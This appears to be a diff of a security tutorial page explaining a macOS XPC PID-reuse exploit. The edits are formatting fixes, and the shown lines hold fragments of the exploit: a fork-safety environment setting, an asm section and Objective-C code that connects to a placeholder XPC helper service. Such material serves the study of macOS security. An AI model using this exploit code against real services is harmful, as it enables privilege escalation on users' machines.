@@ -31,7 +31,7 @@ Check this example exploit (again, taken from the reference) to see the 2 parts 
 * **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.
 
 {% hint style="danger" %}
-For the exploit to work it's important to export export **`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** or to put in th exploit:
+For the exploit to work it's important to `export`` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** or to put inside the exploit:
 
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
@@ -197,7 +197,7 @@ void child_xpc_pid_rc_abuse(){
     // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
     NSString*  service_name = @"com.example.Helper";
     NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
-        // TODO: CNAGE THE PROTOCOL NAME
+    // TODO: CNAGE THE PROTOCOL NAME
     NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
     [connection setRemoteObjectInterface:interface];
     [connection resume];
